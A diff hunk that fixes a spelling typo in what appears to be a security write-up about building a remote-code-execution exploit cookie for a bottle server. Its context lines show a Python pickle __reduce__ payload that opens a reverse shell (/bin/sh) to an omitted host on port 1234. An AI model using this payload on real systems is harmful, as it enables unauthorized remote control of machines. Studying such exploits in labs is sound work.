@@ -98,7 +98,7 @@ I modified my bottle server to generate an RCE exploit cookie that I could pass 
 ```py
 class RCE:
     def __reduce__(self):
-        # I used python since we can guarentee it's installed on the system
+        # I used python since we can guarantee it's installed on the system
         cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<ommited>\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
         return os.system, (cmd,)
 
